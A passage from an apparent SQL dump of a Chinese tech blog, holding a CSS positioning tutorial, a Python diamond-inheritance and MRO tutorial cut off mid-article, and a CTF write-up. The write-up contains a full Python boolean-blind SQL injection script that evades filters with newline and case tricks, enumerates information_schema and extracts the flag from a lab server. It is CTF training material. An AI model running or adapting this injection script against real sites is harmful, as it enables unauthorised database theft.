16px;">static与fixed的定位方式较好理解，在此不做分析。下面对应用的较多的relative和absolute进行分析：</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">1、<span style="color: #ff0000;"><strong>relative</strong></span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"><span style="color: #009900;"><strong>　　</strong></span>　　定位为relative的元素脱离正常的文本流中，但<span style="color: #ff0000;">其在文本流中的位置依然存在</span>。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　　　他是默认参照父级的原始点为原始点，无父级则以文本流的顺序在上一个元素的底部为原始点，配合TRBL进行定位，当父级内有padding等CSS属性时，当前级的原始点则参照父级内容区的原始点进行定位，有以下属性：</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　1)如果没有TRBL，以父级的左上角，在没有父级的时候，他是参照浏览器左上角(到这里和absolute第一条一样)，如果在没有父级元素的情况下，存在文本，则以文本的底部为原始点进行定位并将文字断开(和absolut不同)。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　2)如果设定TRBL，并且父级没有设定position属性，仍旧以父级的左上角为原点进行定位(和absolut不同)。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　3)如果设定TRBL，并且父级设定position属性(无论是absolute还是relative)，则以父级的左上角为原点进行定位，位置\r\n \r\n由TRBL决定(前半段和absolute一样)。如果父级有Padding属性，那么就以内容区域的左上角为原点，进行定位(后半段和absolut不\r\n 同)。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"> 　　以上三点可以总结出，<span style="color: #ff0000;">无论父级存在不存在，无论有没有TRBL，均是以父级的左上角进行定位，但是父级的Padding属性会对其影响。<br/>\r\n	<span style="color: #000000;">　　综合上面对relative的叙述，我们就可以将position属性为relative的DIV视成可以用TRBL进行定位的的普通DIV，或者说\r\n只要将我们平时布局页面的div的CSS属性中加上position:relative后，就不只是用float布局页面了，还可以用TRBL进行布局页\r\n面\r\n 了，或者说加上position:relative的DIV也可以像普通的DIV进行布局页面了，只不过还可以用TRBL进行布局页面。但是 \r\nposition属性为absolute不可以用来布局页面，因为如果用来布局的话，所有的DIV都相对于浏览器的左上角定位了，所以只能用于将某个元素\r\n 定位于属性为absolute的元素的内部某个位置。</span></span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　　　<span style="line-height: 25px;"><span style="line-height: 25px;"><span style="color: #009900;"><strong>Top</strong><span style="color: #454545; line-height: 25px;">的值表示<span style="line-height: 25px;"><span style="color: #009900;">对象相对原位置向下偏移的距离<span style="color: #454545; line-height: 25px;">，<span style="line-height: 25px;"><span style="color: #009900;"><strong>bottom</strong><span style="color: #454545; line-height: 25px;">的值表示<span style="line-height: 25px;"><span style="color: #009900;">对象相对原位置向上偏移的距离，<span style="color: #454545; line-height: 25px;">两者<span style="line-height: 25px;"><span style="color: #009900;">同时存在<span style="color: #454545; line-height: 25px;">时，只有<span style="line-height: 25px;"><span style="color: #009900;">Top<span style="color: #454545; line-height: 25px;">起作用。</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px; line-height: 25px;"><span style="color: #009900;"><strong>　　　　left</strong><span style="color: #454545; line-height: 25px;">的值表示<span style="line-height: 25px;"><span style="color: #009900;">对象相对原位置向右偏移的距离<span style="color: #454545; line-height: 25px;">，<span style="line-height: 25px;"><span style="color: #009900;"><strong>right</strong><span style="color: #454545; line-height: 25px;">的值表示<span style="line-height: 25px;"><span style="color: #009900;">对象相对原位置向左偏移的距离，<span style="color: #454545; line-height: 25px;">两者<span style="line-height: 25px;"><span style="color: #006600;">同时存在<span style="color: #454545; line-height: 25px;">时，只有<span style="line-height: 25px;"><span style="color: #006600;">left<span style="color: #454545; line-height: 25px;">起作用。</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">2、<strong><span style="color: #ff0000;">absolute</span></strong></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　　　定位为absolute的层脱离正常文本流，但与relative的区别是<span style="color: #ff0000;">其在正常流中的位置不再存在</span>。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"><span style="line-height: 19.5px;">这个属性总是有人给出误导。说当position属性设为absolute后，总是按照浏览器窗口来进行定位的，这其实是错误的。实际上，这是fixed属性的特点。<br/></span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"><span style="line-height: 19.5px;">　　1)如果没有TRBL(top、right、bottom、left)，以父级的左上角，在没有父级的时候，他是参照浏览器左上角,如果在没有父级元素的情况下，存在文本，则以它前面的最后一个文字的右上角为原点进行定位但是不断开文字，覆盖于上方。<br/>\r\n	　　2)如果设定TRBL，并且父级没有设定position属性，那么当前的absolute则以浏览器左上角为原始点进行定位，位置将由TRBL决定。<br/>\r\n	　　3)如果设定TRBL，并且父级设定position属性(无论是absolute还是relative)，则以父级的左上角为原点进行定位，位置由\r\nTRBL决定。即使父级有Padding属性，对其也不起作用，说简单点就是：它只坚持一点，就以父级左上角为原点进行定位，父级的padding对其根\r\n本没有影响。</span> <br/></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">\r\n	以上三点可以总结出，<span style="color: #ff0000;">若想把一个定位属性为absolute的元素定位于其父级元素内，只有满足两个条件：</span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　 第一：设定TRBL</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">&nbsp;　第二：父级设定Position属性</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">\r\n	　　上面的这个总结非常重要，可以保证你在用absolue布局页面的时候，不会错位，并且随着浏览器的大小或者显示器分辨率的大小，而不发生改变。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">\r\n	　　只要有一点不满足，元素就会以浏览器左上角为原点，这就是初学者容易犯错的一点，已经定位好的板块，当浏览器的大小改变，父级元素会随之改变，但是设\r\n定Position属性为absolute的板块和父级元素的位置发生改变，错位了，这就是因为此时元素以浏览器的右上角为原点的原因。</span><br/><span style="font-family: Microsoft YaHei; font-size: 16px;">\r\n	　　初学者很容易犯错的是，不清楚Position属性为absolute的板块，若想定位到父级板块中，并且当浏览器的大小改变或显示器的分辨率改变，布局不发生改变，是需要满足两个条件的，只要有一点不满足，元素就会以浏览器左上角为原点，从而导致页面布局错位。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px; line-height: 25px;"><span style="color: #009900;"><strong>　　　　Top</strong><span style="color: #454545; line-height: 25px;">的值表示<span style="line-height: 25px;"><span style="color: #009900;">对象上边框与浏览器窗口顶部的距离，<span style="line-height: 25px;"><span style="color: #009900;">bottom<span style="color: #454545; line-height: 25px;">的值表示<span style="line-height: 25px;"><span style="color: #006600;">对象下边框与浏览器窗口底部的距离，<span style="color: #454545; line-height: 25px;">两者<span style="line-height: 25px;"><span style="color: #009900;">同时存在<span style="color: #454545; line-height: 25px;">时，只有<span style="line-height: 25px;"><span style="color: #ff0000;">Top<span style="color: #454545; line-height: 25px;">起作用；<span style="color: #454545; line-height: 25px;">如果<span style="line-height: 25px;"><span style="color: #009900;">两者都未指定<span style="color: #454545; line-height: 25px;">，则<span style="line-height: 25px;"><span style="color: #009900;">其顶端将与原文档流位置一致<span style="color: #454545; line-height: 25px;">，即<span style="line-height: 25px;"><span style="color: #ff0000;">垂直保持位置不变<span style="color: #454545; line-height: 25px;">。</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px; line-height: 25px;"><span style="color: #009900;"><strong>　　　　left</strong><span style="color: #454545; line-height: 25px;">的值表示<span style="line-height: 25px;"><span style="color: #009900;">对象左边框与浏览器窗口左边的距离，<span style="line-height: 25px;"><span style="color: #009900;">right<span style="color: #454545; line-height: 25px;">的值表示<span style="line-height: 25px;"><span style="color: #009900;">对象右边框与浏览器窗口右边的距离，<span style="color: #454545; line-height: 25px;">两者<span style="line-height: 25px;"><span style="color: #009900;">同时存在<span style="color: #454545; line-height: 25px;">时，只有<span style="line-height: 25px;"><span style="color: #ff0000;">left<span style="color: #454545; line-height: 25px;">起作用；如果两者<span style="line-height: 25px;"><span style="color: #009900;">都未指定<span style="color: #454545; line-height: 25px;">，则其左边将与原文档流位置一致，即水<span style="line-height: 25px;"><span style="color: #ff0000;">平保持位置不变。&nbsp;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　　　<span style="color: #454545; line-height: 25px;">在Position属性值为absolute的同时，如果有一级父对象（无论是父对象还是祖父对象，或者再高的辈分，一样）的Position属性值为Relative时，则上述的相对浏览器窗口定位将会<span style="line-height: 25px;"><span style="color: #ff0000;">变成相对父对象定位<span style="color: #454545; line-height: 25px;">，这对精确定位是很有帮助的。</span></span></span></span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"><strong><span style="color: #ff0000;">3、relative与absolute的主要区别</span></strong></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">首先，是上面已经提到过的在正常流中的位置存在与否。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">其次，<span style="color: #ff0000;">relative定位的层总是相对于其最近的父元素，无论其父元素是何种定位方式</span>。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"><strong><span style="color: #ff0000;">总结：</span></strong></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　属性为relative的元素可以用来布局页面，属性为absolute的元素用来定位某元素在父级中的位置，既然属性为absolute的元素用来定位某元素在父级中位置，就少不了TRBL，这时候根据一开始讲的absolute的第三条，如果父级元素没有position属性那么\r\n absolute元素就会脱离父级元素，但是如果是布局页面，父级元素position的属性又不能为absolute，不然就会以浏览器左上角为原点\r\n 了，所以父级元素的position属性只能为relative！</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"><strong><span style="color: #ff0000;">　</span></strong><span style="color: #ff0000;">　</span><span style="color: #ff0000;">如果用position来布局页面，父级元素的position属性必须为relative，而定位于父级内部某个位置的元素，最好用\r\n absolute，因为它不受父级元素的padding的属性影响，当然你也可以用position，不过到时候计算的时候不要忘记padding的值</span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"><strong>Note : </strong>绝对(absolute)定位对象在可视区域之外会导致滚动条出现。而放置相对(relative)定位对象在可视区域之外，滚动条不会出现。</span></p><p><span style="color: #ff0000; font-family: Microsoft YaHei; font-size: 16px;"><strong>什么是文档流？</strong></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将窗体自上而下分成一行行, 并在每行中按从左至右的顺序排放元素,即为文档流。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #0000ff;"> 只有三种情况会使得元素脱离文档流，分别是：浮动绝对定位和相对定位。</span></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;"><strong><span style="color: #ff0000;">z-index属性</span></strong></span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \r\nz-index，又称为对象的层叠顺序，它用一个整数来定义堆叠的层次，整数值越大，则被层叠在越上面，当然这是指同级元素间的堆叠，如果两个对象的此属\r\n \r\n性具有同样的值，那么将依据它们在HTML文档中流的顺序层叠，写在后面的将会覆盖前面的。需要注意的是，父子关系是无法用z-index来设定上下关系\r\n 的，一定是子级在上父级在下。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">Note：<span style="color: #ff0000;">使用static 定位或无position定位的元素z-index属性是无效的。</span></span></p><p><br/></p>', 'css', 0, 1, '2019-04-20', 64, -1, 0, '/upload/image/20190420/3ce6c59dca18f5396c31b9c168f013fe.jpg'),
	(110, '认真一点！', 'pinger', '<p>&nbsp;&nbsp;&nbsp;&nbsp;自己写了一个py脚本，其中payload函数的作用是将空格替换为换行符(不能直接在post数据里写成%0a，好像会被当成%0a字符实体，不会当成换行符)，把or换成oR（大小写绕过）。注释部分是前期的一些测试数据，得到表名和列名等等，得到了后就可以直接爆flag了，可以去掉注释运行测试测试...</p><p>参考代码如下：</p><p>import requests<br/>import string<br/>import sys<br/>def payload(a):<br/>&nbsp;&nbsp;&nbsp; new=a.replace(&#39; &#39;,chr(0x0a)).replace(&#39;or&#39;,&#39;oR&#39;)<br/>&nbsp;&nbsp;&nbsp; return new<br/><br/>len=0<br/>url=&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;<br/>data={}<br/>status=&quot;You are in&quot;<br/>#爆数据库长度的model<br/>model=&quot;2&#39; or length(database())={0} or &#39;&quot;<br/>&#39;&#39;&#39;<br/>databaseLen=1<br/>print(&#39;\\n正在测试数据库名长度...&#39;)<br/>while True:<br/>&nbsp;&nbsp; &nbsp;data[&#39;id&#39;]=payload(model.format(databaseLen))<br/>&nbsp;&nbsp; &nbsp;r=requests.post(url,data)<br/>&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print(&#39;\\n数据库的长度为：&#39;,databaseLen)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>&nbsp;&nbsp; &nbsp;databaseLen+=1<br/>&nbsp;&nbsp; &nbsp;#databaseLen=18<br/><br/>&nbsp;&nbsp; &nbsp;<br/>#爆数据库名字的model<br/>model=&quot;2&#39; or ascii(mid(database() from {0} for 1))={1} or &#39;&quot;<br/>database=&#39;&#39;<br/>print(&#39;\\n正在测试数据库名...&#39;)<br/>for j in range(1,databaseLen+1):<br/>&nbsp;&nbsp; &nbsp;for k in range(33,126):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#进度条<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.write(&#39;#&#39;+&#39;&gt;&gt;&#39;+&quot;\\b\\b&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;data[&#39;id&#39;]=payload(model.format(j,k))<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;r=requests.post(url,data)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;database+=chr(k)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>print(&#39;\\n数据库名字为：&#39;,database)<br/><br/><br/>print(&#39;\\n正在测试表名字长度...&#39;)<br/>#爆数据表长度的model<br/>model=&quot;2&#39; or length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={0} or &#39;&quot;<br/>tableLen=1<br/>while True:<br/>&nbsp;&nbsp; &nbsp;data[&#39;id&#39;]=payload(model.format(tableLen))<br/>&nbsp;&nbsp; &nbsp;r=requests.post(url,data)<br/>&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print(&#39;\\n表的长度为：&#39;,tableLen)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>&nbsp;&nbsp; &nbsp;tableLen+=1<br/>&nbsp;&nbsp; &nbsp;#tableLen=10<br/>&nbsp;&nbsp; &nbsp;<br/>#爆数据表的名字model<br/>model=&quot;2&#39; or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1))={1} or &#39;&quot;<br/>tables=&#39;&#39;<br/>print(&#39;\\n正在测试表名...&#39;)<br/>for j in range(1,tableLen+1):<br/>&nbsp;&nbsp; &nbsp;for k in range(33,126):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#进度条<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.write(&#39;#&#39;+&#39;&gt;&gt;&#39;+&quot;\\b\\b&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;data[&#39;id&#39;]=payload(model.format(j,k))<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;r=requests.post(url,data)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;tables+=chr(k)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>print(&#39;\\n数据表名字为：&#39;,tables)<br/><br/><br/>tables=tables.split(&quot;,&quot;)<br/>for v in tables:<br/>&nbsp;&nbsp; &nbsp;print(&#39;\\n正在测试列名长度...&#39;)<br/>&nbsp;&nbsp; &nbsp;model=&quot;2&#39; or length((select group_concat(column_name) from information_schema.columns where table_name=&#39;&quot;+v+&quot;&#39;))={0} or &#39;&quot;<br/>&nbsp;&nbsp; &nbsp;colLen=1<br/>&nbsp;&nbsp; &nbsp;while True:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;data[&#39;id&#39;]=payload(model.format(colLen))<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;r=requests.post(url,data)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print(&#39;\\n列的长度为：&#39;,colLen)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;colLen+=1<br/><br/>&nbsp;&nbsp; &nbsp;#爆数列的model<br/>&nbsp;&nbsp; &nbsp;model=&quot;2&#39; or ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;&quot;+v+&quot;&#39;) from {0} for 1))={1} or &#39;&quot;<br/>&nbsp;&nbsp; &nbsp;columns=&#39;&#39;<br/>&nbsp;&nbsp; &nbsp;print(&#39;\\n正在测试列名...&#39;)<br/>&nbsp;&nbsp; &nbsp;for j in range(1,colLen+1):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for k in range(33,126):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#进度条<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.write(&#39;#&#39;+&#39;&gt;&gt;&#39;+&quot;\\b\\b&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;data[&#39;id&#39;]=payload(model.format(j,k))<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;r=requests.post(url,data)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;columns+=chr(k)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>&nbsp;&nbsp; &nbsp;print(&#39;\\n列名字为：&#39;,columns)<br/>&#39;&#39;&#39;<br/><br/>print(&#39;\\n正在爆flag的长度...&#39;)<br/>#爆数据表长度的model<br/>model=&quot;2&#39; or length((select group_concat(fL$4G) from fiag))={0} or &#39;&quot;<br/>flagLen=1<br/>while True:<br/>&nbsp;&nbsp; &nbsp;data[&#39;id&#39;]=payload(model.format(flagLen))<br/>&nbsp;&nbsp; &nbsp;r=requests.post(url,data)<br/>&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print(&#39;\\n表的长度为：&#39;,flagLen)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>&nbsp;&nbsp; &nbsp;flagLen+=1<br/>&nbsp;&nbsp; &nbsp;#flagLen=10<br/>&nbsp;&nbsp; &nbsp;<br/>#爆数据表的名字model<br/>model=&quot;2&#39; or ascii(mid((select group_concat(fL$4G) from fiag) from {0} for 1))={1} or &#39;&quot;<br/>flag=&#39;&#39;<br/>print(&#39;\\n正在爆flag...&#39;)<br/>for j in range(1,flagLen+1):<br/>&nbsp;&nbsp; &nbsp;for k in range(33,126):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#进度条<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.write(&#39;#&#39;+&#39;&gt;&gt;&#39;+&quot;\\b\\b&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;data[&#39;id&#39;]=payload(model.format(j,k))<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;r=requests.post(url,data)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;flag+=chr(k)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>print(&#39;\\nflag为：&#39;,flag)<br/>tmp=input(&quot;Press any to exit...&quot;)</p>', 'wp', 0, 7, '2019-04-20', 63, -2, 0, '/upload/image/20190420/b921d075f53ca3b11da5e0b9eb9d4b8e.jpg'),
	(111, 'python之钻石继承', '**', '<h2>1.&nbsp;&nbsp; Python的继承以及调用父类成员</h2><p style="margin-left:10px;">python子类调用父类成员有2种方法，分别是普通方法和super方法</p><p style="margin-left:10px;">假设Base是基类</p><pre>class&nbsp;Base(object):　&nbsp;def&nbsp;__init__(self):　　　　print&nbsp;“Base&nbsp;init”</pre><p style="margin-left:10px;">则普通方法如下</p><pre>class&nbsp;Leaf(Base):def&nbsp;__init__(self):Base.__init__(self)print&nbsp;“Leaf&nbsp;init”</pre><p style="margin-left:10px;">super方法如下</p><pre>class&nbsp;Leaf(Base):def&nbsp;__init__(self):super(Leaf,&nbsp;self).__init__()print&nbsp;“Leaf&nbsp;init”</pre><p style="margin-left:10px;">在上面的简单场景下，两种方法的效果一致：</p><p style="margin-left:10px;">&gt;&gt;&gt; leaf = Leaf()</p><p style="margin-left:10px;">Base init</p><p style="margin-left:10px;">Leaf init</p><h1><a></a>2.&nbsp;&nbsp; 钻石继承遇到的难题</h1><p style="margin-left:10px;">当我们来到钻石继承场景时，我们就遇到了一个难题：</p><p style="margin-left:10px;"><img alt="" class="has" src="/upload/image/20190420/1555767645507826.png"/></p><p style="margin-left:10px;">如果我们还是使用普通方法调用父类成员，代码如下：</p><p><a target="_blank"><img alt="复制代码" class="has" src="/upload/image/20190420/1555767646399285.gif"/></a></p><pre>class&nbsp;Base(object):def&nbsp;__init__(self):print&nbsp;“Base&nbsp;init”class&nbsp;Medium1(Base):def&nbsp;__init__(self):Base.__init__(self)print&nbsp;“Medium1&nbsp;init”class&nbsp;Medium2(Base):def&nbsp;__init__(self):Base.__init__(self)print&nbsp;“Medium2&nbsp;init”class&nbsp;Leaf(Medium1,&nbsp;Medium2):def&nbsp;__init__(self):Medium1.__init__(self)Medium2.__init__(self)print&nbsp;“Leaf&nbsp;init”</pre><p><a target="_blank"><img alt="复制代码" class="has" src="/upload/image/20190420/1555767646399285.gif"/></a></p><p style="margin-left:10px;">当我们生成Leaf对象时，结果如下：</p><p style="margin-left:10px;">&gt;&gt;&gt; leaf = Leaf()</p><p style="margin-left:10px;"><span style="color:#ff0000;">Base init</span></p><p style="margin-left:10px;">Medium1 init</p><p style="margin-left:10px;"><span style="color:#ff0000;">Base init</span></p><p style="margin-left:10px;">Medium2 init</p><p style="margin-left:10px;">Leaf init</p><p style="margin-left:10px;">&nbsp;</p><p style="margin-left:10px;">可以看到Base被初始化了<span style="color:#ff0000;">两次</span>！这是由于Medium1和Medium2各自调用了Base的初始化函数导致的。</p><h1><a></a>3.&nbsp;&nbsp; 各语言的解决方法</h1><p style="margin-left:10px;">钻石继承中，父类被多次初始化是个非常难缠的问题，我们来看看其他各个语言是如何解决这个问题的：</p><h2><a></a>3.1. C++</h2><p style="margin-left:10px;">C++使用虚拟继承来解决钻石继承问题。</p><p style="margin-left:10px;">Medium1和Medium2虚拟继承Base。当生成Leaf对象时，Medium1和Medium2并不会自动调用虚拟基类Base的构造函数，而需要由Leaf的构造函数显式调用Base的构造函数。</p><h2><a></a>3.2. Java</h2><p style="margin-left:10px;">Java禁止使用多继承。</p><p style="margin-left:10px;">Java使用单继承+接口实现的方式来替代多继承，避免了钻石继承产生的各种问题。</p><h2><a></a>3.3. Ruby</h2><p style="margin-left:10px;">Ruby禁止使用多继承。</p><p style="margin-left:10px;">Ruby和Java一样只支持单继承，但它对多继承的替代方式和Java不同。Ruby使用Mixin的方式来替代，在当前类中mixin入其他模块，来做到代码的组装效果。</p><h2><a></a>3.4. Python</h2><p style="margin-left:10px;">Python和C++一样，支持多继承的语法。但Python的解决思路和C++完全不一样，Python使用的是super</p><p style="margin-left:10px;">我们把第2章的钻石继承用super重写一下，看一下输出结果</p><p><a target="_blank"><img alt="复制代码" class="has" src="/upload/image/20190420/1555767646399285.gif"/></a></p><pre>class&nbsp;Base(object):def&nbsp;__init__(self):print&nbsp;“Base&nbsp;init”class&nbsp;Medium1(Base):def&nbsp;__init__(self):super(Medium1,&nbsp;self).__init__()print&nbsp;“Medium1&nbsp;init”class&nbsp;Medium2(Base):def&nbsp;__init__(self):super(Medium2,&nbsp;self).__init__()print&nbsp;“Medium2&nbsp;init”class&nbsp;Leaf(Medium1,&nbsp;Medium2):def&nbsp;__init__(self):super(Leaf,&nbsp;self).__init__()print&nbsp;“Leaf&nbsp;init”</pre><p><a target="_blank"><img alt="复制代码" class="has" src="/upload/image/20190420/1555767646399285.gif"/></a></p><p style="margin-left:10px;">我们生成Leaf对象：</p><p style="margin-left:10px;">&gt;&gt;&gt; leaf = Leaf()</p><p style="margin-left:10px;">Base init</p><p style="margin-left:10px;">Medium2 init</p><p style="margin-left:10px;">Medium1 init</p><p style="margin-left:10px;">Leaf init</p><p style="margin-left:10px;">可以看到整个初始化过程符合我们的预期，Base只被初始化了1次。而且重要的是，相比原来的普通写法，super方法并没有写额外的代码，也没有引入额外的概念</p><h1><a></a>4.&nbsp;&nbsp; super的内核：mro</h1><p style="margin-left:10px;">要理解super的原理，就要先了解mro。mro是method resolution order的缩写，表示了类继承体系中的成员解析顺序。</p><p style="margin-left:10px;">&nbsp;</p><p style="margin-left:10px;">在python中，每个类都有一个mro的类方法。我们来看一下钻石继承中，Leaf类的mro是什么样子的：</p><p style="margin-left:10px;">&gt;&gt;&gt; Leaf.mro()</p><p style="margin-left:10px;">[&lt;class &#39;__main__.Leaf&#39;&gt;, &lt;class \r\n&#39;__main__.Medium1&#39;&gt;, &lt;class &#39;__main__.Medium2&#39;&gt;, &lt;class \r\n&#39;__main__.Base&#39;&gt;, &lt;type &#39;object&#39;&gt;]</p><p style="margin-left:10px;">&nbsp;</p><p style="margin-left:10px;">可以看到mro方法返回的是一个祖先类的列表。Leaf的每个祖先都在其中出现一次，这也是super在父类中查找成员的顺序。&nbsp;</p><p style="margin-left:10px;">通过mro，python巧妙地将多继承的图结构，转变为list的顺序结构。super在继承体系中向上的查找过程，变成了在mro中向右的线性查找过程，任何类都只会被处理一次。</p><p style="margin-left:10px;">&nbsp;</p><p style="margin-left:10px;">通过这个方法，python解决了多继承中的2大难题：</p><p style="margin-left:10px;">1. 查找顺序问题。从Leaf的mro顺序可以看出，如果Leaf类通过super来访问父类成员，那么Medium1的成员会在Medium2之前被首先访问到。如果Medium1和Medium2都没有找到，最后再到Base中查找。</p><p style="margin-left:10px;">2. 钻石继承的多次初始化问题。在mro的list中，Base类只出现了一次。事实上任何类都只会在mro list中出现一次。这就确保了super向上调用的过程中，任何祖先类的方法都只会被执行一次。</p><p style="margin-left:10px;">&nbsp;</p><p style="margin-left:10px;">至于mro的生成算法，可以参考这篇wiki：https://en.wikipedia.org/wiki/C3_linearization</p><h1><a></a>5.&nbsp;&nbsp; super的具体用法</h1><p style="margin-left:10px;">我们首先来看一下python中的super文档</p><p style="margin-left:10px;">&gt;&gt;&gt; help(super)</p><p style="margin-left:10px;">Help on class super in module __builtin__:</p><p style="margin-left:10px;">class super(object)</p><p style="margin-left:10px;">&nbsp;|&nbsp; super(type, obj) -&gt; bound super object; requires isinstance(obj, type)</p><p style="margin-left:10px;">&nbsp;|&nbsp; super(type) -&gt; unbound super object</p><p style="margin-left:10px;">&nbsp;|&nbsp; super(type, type2) -&gt; bound super object; requires issubclass(type2, type)</p><p style="margin-left:10px;">&nbsp;</p><p 